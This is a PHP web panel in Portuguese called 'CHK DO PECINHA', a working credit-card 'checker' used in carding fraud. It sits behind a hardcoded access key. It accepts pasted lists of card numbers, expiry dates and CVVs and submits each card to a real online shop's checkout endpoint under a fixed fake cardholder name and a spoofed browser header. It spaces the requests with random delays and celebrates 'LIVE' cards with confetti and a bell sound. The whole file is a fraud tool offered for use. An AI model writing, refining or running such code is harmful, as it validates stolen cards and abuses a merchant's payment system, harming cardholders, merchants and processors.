<?php
// =====================================================
// ✅ CHK DO PECINHA - COM EFEITO SONORO DE SINO (PLIM)
// =====================================================

session_start();

// Chave de acesso única do sistema
$chave_valida = "A4B9X2M7K1P8"; 
$erro = "";

// 1. Processar Login por Chave
if (isset($_POST['f_login'])) {
    $chave_digitada = trim($_POST['chave'] ?? '');
    
    if ($chave_digitada === $chave_valida) {
        $_SESSION['logado'] = true;
        header("Location: index.php");
        exit;
    } else {
        $erro = "Chave de acesso inválida! Verifique os 12 caracteres.";
    }
}

// 2. Processar Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: index.php");
    exit;
}

// 3. Processar Requisição do Checker (Gateway Real Integrado via cURL)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
    if (!isset($_SESSION['logado'])) {
        echo json_encode(['status' => 'error', 'html' => "<span class='text-zinc-500'>[ERRO] Sessão expirada. Faça login novamente.</span>"]);
        exit;
    }

    $cartao_input = trim($_POST['lista']);
    $dados_cc = explode('|', $cartao_input);
    
    if (count($dados_cc) < 4) {
        echo json_encode(['status' => 'error', 'html' => "<span class='text-zinc-500'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>"]);
        exit;
    }

    $cc_num = trim($dados_cc[0]);
    $cc_mes = trim($dados_cc[1]);
    $cc_ano = trim($dados_cc[2]);
    $cc_cvv = trim($dados_cc[3]);

    // Endpoint real capturado no navegador
    $url = "https://franadesivos.com.br/checkout/pay";

    $dados_envio = [
        'default'         => '277958',
        'shipping-method' => 'mandae_economico',
        'payment-type'    => 'getnet_mastercard',
        'ccnumber'        => $cc_num,
        'ccname'          => 'LUCAS DOS SANTOS PEREIRA',
        'ccmonth'         => $cc_mes,
        'ccyear'          => $cc_ano,
        'cccvc'           => $cc_cvv,
        'installment'     => '1',
        'coupon_code'     => '',
        'grc-response'    => ''
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados_envio));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]);

    $resposta_bruta = curl_exec($ch);
    curl_close($ch);

    $resposta_json = json_decode($resposta_bruta, true);
    $status_site = $resposta_json['status'] ?? 'failed';
    $retorno_msg = $resposta_json['message'] ?? 'Erro desconhecido';

    if ($status_site === 'success' || $status_site === 'approved') {
        $html = "<span class='text-black font-extrabold bg-white px-2.5 py-0.5 rounded shadow-md tracking-wide'>[LIVE]</span> <span class='text-white font-medium'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
        echo json_encode(['status' => 'live', 'html' => $html]);
    } else {
        $html = "<span class='text-zinc-600 font-bold'>[DIE]</span> <span class='text-zinc-600'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
        echo json_encode(['status' => 'die', 'html' => $html]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHK DO PECINHA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.03); }
            50% { box-shadow: 0 0 35px rgba(255, 255, 255, 0.1); }
        }
        @keyframes flashLive {
            0% { border-color: rgba(255, 255, 255, 1); background-color: rgba(255, 255, 255, 0.08); }
            100% { border-color: rgba(39, 39, 42, 1); background-color: rgba(0, 0, 0, 0.4); }
        }
        @keyframes screenShake {
            0%, 100% { transform: translate(0, 0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-1px, -1px); }
            80% { transform: translate(1px, 1px); }
        }
        .card-glow {
            animation: glow 4s infinite ease-in-out;
        }
        .live-flash-effect {
            animation: flashLive 1.2s ease-out, screenShake 0.3s ease-in-out;
        }
    </style>
</head>
<body class="bg-black text-zinc-100 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">

    <?php if (!isset($_SESSION['logado'])): ?>
        <!-- TELA DE LOGIN POR CHAVE -->
        <div class="w-full max-w-md bg-zinc-900 p-8 rounded-2xl shadow-2xl border border-zinc-800 text-center card-glow">
            
            <div class="mb-6 flex justify-center">
                <img src="logo.png" alt="Logotipo Pecinha" class="h-28 w-28 object-cover rounded-full border-2 border-zinc-700 shadow-xl p-1 bg-black" onerror="this.style.display='none'">
            </div>

            <h1 class="text-2xl font-bold mb-1 tracking-wider text-white">CHK DO PECINHA</h1>
            <p class="text-xs text-zinc-400 mb-6 font-mono uppercase tracking-widest">Autenticação Segura</p>
            
            <?php if (!empty($erro)): ?>
                <div class="bg-zinc-800 border border-zinc-700 text-zinc-300 p-3 rounded-xl mb-4 text-xs text-center font-mono">
                    <?php echo $erro; ?>
                </div>
            <?php endif; ?>

            <form method="POST">
                <input type="hidden" name="f_login" value="1">
                <div class="mb-6 text-left">
                    <label class="block text-xs font-mono uppercase tracking-wider mb-2 text-zinc-400">Chave de Acesso:</label>
                    <input type="text" name="chave" required maxlength="12" class="w-full bg-black border border-zinc-800 rounded-xl p-3 text-sm focus:outline-none focus:border-zinc-500 text-zinc-200 uppercase tracking-widest text-center font-mono transition" placeholder="INSIRA SUA CHAVE">
                </div>
                <button type="submit" class="w-full bg-white hover:bg-zinc-200 text-black font-bold py-3 rounded-xl transition duration-200 shadow-lg font-mono text-xs uppercase tracking-widest">
                    Acessar Painel
                </button>
            </form>
        </div>

    <?php else: ?>
        <!-- PAINEL PRINCIPAL -->
        <div id="mainPanel" class="w-full max-w-2xl bg-zinc-900 p-6 sm:p-8 rounded-2xl shadow-2xl border border-zinc-800 card-glow transition-all duration-300">
            <div class="flex justify-between items-center mb-6 border-b border-zinc-800 pb-4">
                <div class="flex items-center gap-3">
                    <img src="logo.png" alt="Logo Pecinha" class="h-12 w-12 object-cover rounded-full border border-zinc-700 shadow" onerror="this.style.display='none'">
                    <div>
                        <h1 class="text-lg font-bold text-white tracking-wide">CHK DO PECINHA</h1>
                        <span class="text-[10px] text-zinc-400 font-mono">SYSTEM ACTIVE</span>
                    </div>
                </div>
                <a href="index.php?action=logout" class="bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-xs px-3 py-1.5 rounded-lg border border-zinc-700 transition font-mono">Sair</a>
            </div>
            
            <div class="mb-4">
                <label class="block text-xs font-mono uppercase tracking-wider mb-2 text-zinc-400">Lista de Cartões (NUMERO|MES|ANO|CVV):</label>
                <textarea id="lista" rows="5" class="w-full bg-black border border-zinc-800 rounded-xl p-3 text-xs focus:outline-none focus:border-zinc-500 text-zinc-200 font-mono transition" placeholder="4066699932589171|04|2031|829"></textarea>
            </div>

            <div class="mb-6">
                <button onclick="iniciarChecagem()" id="btnChecar" class="w-full bg-white hover:bg-zinc-200 text-black font-bold py-3.5 rounded-xl transition duration-200 shadow-lg font-mono text-xs uppercase tracking-widest">
                    Iniciar Checagem (Intervalo 15s a 20s)
                </button>
            </div>

            <div>
                <div class="flex justify-between items-center mb-2">
                    <label class="block text-xs font-mono uppercase tracking-wider text-zinc-400">Logs em Tempo Real:</label>
                    <span id="contador" class="text-xs text-zinc-500 font-mono">Progresso: 0 / 0</span>
                </div>
                <div id="resultado" class="w-full h-56 bg-black border border-zinc-800 rounded-xl p-4 text-xs font-mono overflow-y-auto text-zinc-400 space-y-2 selection:bg-zinc-800">
                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições...</span>
                </div>
            </div>
        </div>

        <script>
            // Função para tocar o som de sino "Plim" sintético em alta qualidade
            function tocarSomPlim() {
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    
                    const osc = audioCtx.createOscillator();
                    const gainNode = audioCtx.createGain();

                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(1046.50, audioCtx.currentTime); // C6
                    osc.frequency.exponentialRampToValueAtTime(2093.00, audioCtx.currentTime + 0.1);

                    gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
                    gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 1.2);

                    osc.connect(gainNode);
                    gainNode.connect(audioCtx.destination);

                    osc.start();
                    osc.stop(audioCtx.currentTime + 1.2);
                } catch (e) {
                    // Ignora bloqueios de autoplay do navegador se houver
                }
            }

            function dispararConfeteLive() {
                const count = 100;
                const defaults = {
                    origin: { y: 0.7 },
                    colors: ['#ffffff', '#e4e4e7', '#a1a1aa', '#52525b'],
                    zIndex: 9999
                };

                function fire(particleRatio, opts) {
                    confetti(Object.assign({}, defaults, opts, {
                        particleCount: Math.floor(count * particleRatio)
                    }));
                }

                fire(0.25, { spread: 26, startVelocity: 55 });
                fire(0.2, { spread: 60 });
                fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
                fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
                fire(0.1, { spread: 120, startVelocity: 45 });
            }

            async function iniciarChecagem() {
                const texto = document.getElementById('lista').value.trim();
                const resDiv = document.getElementById('resultado');
                const btn = document.getElementById('btnChecar');
                const contador = document.getElementById('contador');
                const panel = document.getElementById('mainPanel');

                if (!texto) {
                    alert('Insira uma lista de cartões válida!');
                    return;
                }

                const linhas = texto.split('\n').map(l => l.trim()).filter(l => l !== '');
                if (linhas.length === 0) return;

                btn.disabled = true;
                btn.classList.add('opacity-50', 'cursor-not-allowed');
                btn.innerText = "Processando checagem...";
                resDiv.innerHTML = "";
                
                for (let i = 0; i < linhas.length; i++) {
                    const linhaAtual = linhas[i];
                    contador.innerText = `Progresso: ${i + 1} / ${linhas.length}`;

                    try {
                        let response = await fetch('index.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'lista=' + encodeURIComponent(linhaAtual)
                        });
                        let data = await response.json();
                        
                        let itemDiv = document.createElement('div');
                        
                        if (data.status === 'live') {
                            itemDiv.className = "transition-all duration-500 transform translate-y-1 opacity-0 border-l-4 border-white bg-zinc-900/90 p-2 rounded-r shadow-lg live-flash-effect";
                        } else {
                            itemDiv.className = "transition-all duration-300 transform translate-y-1 opacity-0 border-l-2 border-zinc-800 pl-2 py-0.5";
                        }

                        itemDiv.innerHTML = data.html;
                        resDiv.appendChild(itemDiv);
                        
                        setTimeout(() => {
                            itemDiv.classList.remove('translate-y-1', 'opacity-0');
                        }, 50);

                        resDiv.scrollTop = resDiv.scrollHeight;

                        if (data.status === 'live') {
                            tocarSomPlim();
                            dispararConfeteLive();
                            panel.classList.add('live-flash-effect');
                            setTimeout(() => {
                                panel.classList.remove('live-flash-effect');
                            }, 1200);
                        }

                    } catch (err) {
                        resDiv.innerHTML += `<div class='text-zinc-600'>[ERRO] Falha na requisição: ${linhaAtual}</div>`;
                    }

                    if (i < linhas.length - 1) {
                        const randomDelay = Math.floor(Math.random() * (20000 - 15000 + 1)) + 15000;
                        await new Promise(resolve => setTimeout(resolve, randomDelay));
                    }
                }

                btn.disabled = false;
                btn.classList.remove('opacity-50', 'cursor-not-allowed');
                btn.innerText = "Iniciar Checagem (Intervalo 15s a 20s)";
            }
        </script>
    <?php endif; ?>
</body>
</html>
